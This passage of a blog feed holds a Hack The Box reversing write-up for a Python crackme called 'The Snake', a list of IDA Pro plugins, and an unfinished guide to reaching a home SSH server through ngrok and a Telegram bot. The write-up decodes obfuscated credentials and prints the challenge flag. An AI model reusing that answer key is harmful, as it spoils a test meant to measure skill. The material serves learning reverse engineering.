&lt;li&gt;&lt;strong&gt;Difficulty:&lt;/strong&gt; &lt;em&gt;easy&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Score:&lt;/strong&gt; 10&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Flag should be in the format: HTB{username:password}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;overview&#34;&gt;Overview&lt;/h2&gt;
&lt;p&gt;We have got the python script that is waiting for some username and password:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ python snake.py

___________.__               _________              __
\__    ___/|  |__   ____    /   _____/ ____ _____  |  | __ ____
 |    |   |  |  \_/ __ \   \_____  \ /    \__  \ |  |/ // __ \
 |    |   |   Y  \  ___/   /        \   |  \/ __ \|    &amp;lt;\  ___/
 |____|   |___|  /\___  &amp;gt; /_______  /___|  (____  /__|_ \___  &amp;gt;
               \/     \/          \/     \/     \/     \/    \/


The Snake Created by 3XPL017
Your number is 809
Authentication required

Enter your username
QWE
Wrong username try harder
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let&amp;rsquo;s look into code to get more info about how to get username and password.&lt;/p&gt;
&lt;h2 id=&#34;bypass-code&#34;&gt;Bypass code&lt;/h2&gt;
&lt;p&gt;We can see partially obfuscated variables, that are later xored with some values, let&amp;rsquo;s try to get username.&lt;/p&gt;
&lt;h3 id=&#34;username&#34;&gt;Username&lt;/h3&gt;
&lt;p&gt;Username is combined from random dropped variables that are of course hex-encoded letters (i.e &lt;code&gt;db = &#39;\x6e&#39;&lt;/code&gt;).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;user_input &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Enter your username&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; user_input &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; slither:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Wrong username try harder&amp;#39;&lt;/span&gt;
    exit()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To get correct username we should know the slither value, we can easly get it by printing before verification check.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;ve decided to &amp;lsquo;patch&amp;rsquo; above code into:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;user_input &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; slither
print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;====&amp;gt; Username: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(user_input)
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; user_input &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; slither:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;&amp;gt; python snake.py

___________.__               _________              __
\__    ___/|  |__   ____    /   _____/ ____ _____  |  | __ ____
  |    |   |  |  \_/ __ \   \_____  \ /    \__  \ |  |/ // __ \
  |    |   |   Y  \  ___/   /        \   |  \/ __ \|    &amp;lt;\  ___/
  |____|   |___|  /\___  &amp;gt; /_______  /___|  (____  /__|_ \___  &amp;gt;
                \/     \/          \/     \/     \/     \/    \/


The Snake Created by 3XPL017
Your number is 351
Authentication required

====&amp;gt; Username: anaconda
Enter your password
PASSWORD
Wrong password try harder
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Yay, so the username is &lt;code&gt;anaconda&lt;/code&gt;, now we need to guess password.&lt;/p&gt;
&lt;h3 id=&#34;password&#34;&gt;Password&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;pass_input &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Enter your password&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; passes &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; pass_input:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; char &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; chars:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; passes &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; str(chr(char)):
            print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Good Job&amp;#39;&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Wrong password try harder&amp;#39;&lt;/span&gt;
            exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This part is much harder, because every input which starts with &lt;code&gt;&#39;u&#39;&lt;/code&gt; is accepted (we can realize it by checking runtime to which letter input is compared). This is probably &amp;ldquo;programming mistake&amp;rdquo;, now we should guess what author wanted to achieve - what kind of verification.&lt;/p&gt;
&lt;p&gt;We can also get all chars array (&lt;code&gt;[117, 100, 118, 118, 114, 106, 119, 97, 36, 36, 126, 114, 115, 125, 42, 115, 125, 42, 107, 42, 126, 124, 121, 118, 118]&lt;/code&gt;) and print this as string: &lt;code&gt;&amp;quot;udvvrjwa$$~rs}*s}*k*~|yvv&amp;quot;&lt;/code&gt;, but this is not our password :/&lt;/p&gt;
&lt;p&gt;Making a step back, by ignoring loop where chars are incremented by &lt;code&gt;0xA&lt;/code&gt; we can read that chars is just a message: &lt;code&gt;&amp;quot;this is a troll&amp;quot;&lt;/code&gt;, so the real password is somewhere else.&lt;/p&gt;
&lt;p&gt;We can also notice unused variable password: &lt;code&gt;password = [0x69, 0x74, 0x73, 0x20, 0x6e, 0x6f, 0x74, 0x20, 0x74, 0x68, 0x61, 0x74, 0x20, 0x65, 0x61, 0x73, 0x79]&lt;/code&gt;, but this is just another rabbit hole:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0x69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6e&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6f&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x68&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x79&lt;/span&gt;]
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; password:
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;   s &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(c)
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; s
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;its not that easy&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With some additional prints we can notice that output and &lt;code&gt;lock = 5&lt;/code&gt; variable are the same:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;==&amp;gt; chains: this is a troll
==&amp;gt; keys: password!!
==&amp;gt; auth: keep trying
Your number is 774
Lock 5
==&amp;gt; chars1: udvvrjwa$$
==&amp;gt; chars2: udvvrjwa$$~rs}*s}*k*~|yvv
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;My simplified code which gives above result:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/python2.7&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; random 

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;print_array&lt;/span&gt;(name, chars):
    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; chars:
        r &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(c)
    print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;==&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(name, r)

chains &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x68&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x72&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6f&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6c&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6c&lt;/span&gt;]
keys &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0x70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x77&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6f&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x72&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x64&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x21&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x21&lt;/span&gt;]
auth &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0x6b&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x72&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x79&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6e&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x67&lt;/span&gt;]

print_array(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chains&amp;#34;&lt;/span&gt;, chains)
print_array(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;keys&amp;#34;&lt;/span&gt;, keys)
print_array(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;auth&amp;#34;&lt;/span&gt;, auth)

chars &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []

lock_pick &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;randint(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3e8&lt;/span&gt;)
lock &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lock_pick &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
lock &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lock &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
lock &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lock &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
lock &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lock &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; lock_pick

print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Your number is &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(lock_pick)
print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Lock &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(lock)

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; key &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; keys:
    keys_encrypt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lock &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; key
    chars&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(keys_encrypt)

print_array(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chars1&amp;#34;&lt;/span&gt;, chars)
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; chain &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; chains:
    chains_encrypt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; chain &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA&lt;/span&gt;
    chars&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(chains_encrypt)
print_array(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chars2&amp;#34;&lt;/span&gt;, chars)


pass_input &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Enter your password&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; passes &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; pass_input:
    print chars
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; char &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; chars:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; passes &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; str(chr(char)):
            print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Good Job&amp;#39;&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Wrong password try harder&amp;#39;&lt;/span&gt;
            exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After we delete &amp;lsquo;troll-part&amp;rsquo; of password we can check the flag : &lt;code&gt;HTB{anaconda:udvvrjwa$$}&lt;/code&gt; we will get a success.&lt;/p&gt;
&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
&lt;p&gt;After we will make some understanding of all strings, variables and code we can get the flag, but to be clear: this is more like &lt;em&gt;try every possible flag&lt;/em&gt; challenge, than challenge which will allow you to learn something.&lt;/p&gt;
&lt;p&gt;It&amp;rsquo;s just internet troll - but not very funny.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Ida Pro Plugins</title>
      <link>/posts/ida-pro-plugins/</link>
      <pubDate>Sat, 15 Feb 2020 12:01:53 +0100</pubDate>
      
      <guid>/posts/ida-pro-plugins/</guid>
      <description>&lt;p&gt;Plugins worth installing&lt;/p&gt;</description>
      <content>&lt;p&gt;Plugins worth installing&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/OALabs/FindYara&#34;&gt;FindYara&lt;/a&gt; - use yara rules for looking into binary&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/polymorf/findcrypt-yara&#34;&gt;Findcrypt YARA&lt;/a&gt; - find crypto structs with yara rules&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/vrtadmin/FIRST&#34;&gt;FIRST&lt;/a&gt; - community driven Lunsa function matching plugin&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/CheckPointSW/Karta&#34;&gt;Karta&lt;/a&gt; - open source lib functions matching&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/joxeankoret/diaphora&#34;&gt;Diaphora&lt;/a&gt; - diff binaries&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/hasherezade/ida_ifl&#34;&gt;IDA IFL&lt;/a&gt; - interactive function list&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/cseagle/blc&#34;&gt;blc&lt;/a&gt; - decompiler based on Ghidra&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://retdec.com/idaplugin/&#34;&gt;retdec&lt;/a&gt; - standalone decompiler&lt;/li&gt;
&lt;/ul&gt;</content>
    </item>
    
    <item>
      <title>Expose Any Port With Ngrok</title>
      <link>/posts/expose-any-port-with-ngrok/</link>
      <pubDate>Sat, 01 Feb 2020 13:53:37 +0100</pubDate>
      
      <guid>/posts/expose-any-port-with-ngrok/</guid>
      <description>&lt;p&gt;How to expose any port to the Internet without exposing your private IP (for free).&lt;/p&gt;</description>
      <content>&lt;p&gt;How to expose any port to the Internet without exposing your private IP (for free).&lt;/p&gt;
&lt;p&gt;Today I will show you how to easly setup exposure of any port without exposing your IP, this solution also bypasses situation when your ISP is not giving possibility to have private (own) IP address which is not behind any NAT.&lt;/p&gt;
&lt;p&gt;I used this solution to create access (for myself) to SSH and locally hosted security camera system at my home.&lt;/p&gt;
&lt;h2 id=&#34;1-setup-ngrok&#34;&gt;1. Setup NGrok&lt;/h2&gt;
&lt;p&gt;First of all you need to have an ngrok account&lt;a href=&#34;#references&#34;&gt;[1]&lt;/a&gt; - free account is enough for our purposes. Generally ngrok is a reverse-proxy service where you need tun ngrok client on target machine, client enables connection with ngrok server and then you are able to connect with your machine (where ngrok client is running) via Internet.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Free acount forwards local port as random remote port (usually under const hostname: &lt;code&gt;0.tcp.ngrok.io&lt;/code&gt; for tcp tunnels)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;After you have account you need to download client and activate account with your API key (follow the instuctions from web service).&lt;/p&gt;
&lt;h2 id=&#34;2-verify-that-tunnel-works&#34;&gt;2. Verify that tunnel works&lt;/h2&gt;
&lt;p&gt;Create ngrok config file (under &lt;code&gt;~/.ngrok2/ngrok.yml&lt;/code&gt;):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;authtoken&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;&amp;lt;YOUR_TOKEN_HERE&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;tunnels&lt;/span&gt;:
        &lt;span style=&#34;color:#f92672&#34;&gt;sshglob&lt;/span&gt;:
                &lt;span style=&#34;color:#f92672&#34;&gt;proto&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;tcp&lt;/span&gt;
                &lt;span style=&#34;color:#f92672&#34;&gt;addr&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Above config setups tunnel &lt;code&gt;sshglob&lt;/code&gt; which forwards locally hosted &lt;code&gt;tcp/22&lt;/code&gt; - in this case SSH service. You should change these values according to your needs.&lt;/p&gt;
&lt;p&gt;Now you can try to start ngrok &lt;code&gt;ngrok start sshglob&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;ngrok by @inconshreveable                                                            (Ctrl+C to quit)

Session Status                online
Account                       whoami (Plan: Free)
Version                       2.3.35
Region                        United States (us)
Web Interface                 http://127.0.0.1:4040
Forwarding                    tcp://0.tcp.ngrok.io:13036 -&amp;gt; localhost:22

Connections                   ttl     opn     rt1     rt5     p50     p90
                              0       0       0.00    0.00    0.00    0.00
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now you should be able to connect with ssh (in my case) with command: &lt;code&gt;ssh -p 13036 whoami@0.tcp.ngrok.io&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;If you don&amp;rsquo;t have any issues with accessing you machine over Internet you are free to follow next steps :) (otherwise check &lt;a href=&#34;#troubleshooting&#34;&gt;Troubleshooting&lt;/a&gt; section).&lt;/p&gt;
&lt;h2 id=&#34;3-bypass-random-port-issue&#34;&gt;3. Bypass random port issue&lt;/h2&gt;
&lt;p&gt;If you run ngrok couple of times you should notice that every time you service is running at random port, to bypass this issue you can by a premium or make some additional steps presented below.&lt;/p&gt;
&lt;h3 id=&#34;install-dependencies&#34;&gt;Install dependencies&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo apt install -y python3 python3-pip curl jq
pip3 install telegram
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;setup-telegram-bot&#34;&gt;Setup Telegram bot&lt;/h3&gt;
&lt;p&gt;For myself I decided to create Telegram&lt;a href=&#34;#references&#34;&gt;[2]&lt;/a&gt; bot which will send me external hostname and random IP address. Ofc you need to have created Telegram account to follow next steps.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Start conversation with telegram &lt;a href=&#34;https://t.me/botfather&#34;&gt;Botfather&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Type commands in Botfather conversation:&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/newbot
mysuper_bot &lt;span style=&#34;color:#75715e&#34;&gt;# replace &amp;#34;mysuper&amp;#34; with your bot name&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Copy API key and start conversation with your bot&lt;/li&gt;
&lt;li&gt;Type something in the chat &amp;amp; run the below code:&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; sys &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; argv
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; telegram

bot &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; telegram&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Bot(token&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;YOUR_API_KEY&amp;#34;&lt;/span&gt;)
print(bot&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getUpdates())
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Copy &lt;code&gt;chat_id&lt;/code&gt;&lt;/li&gt;
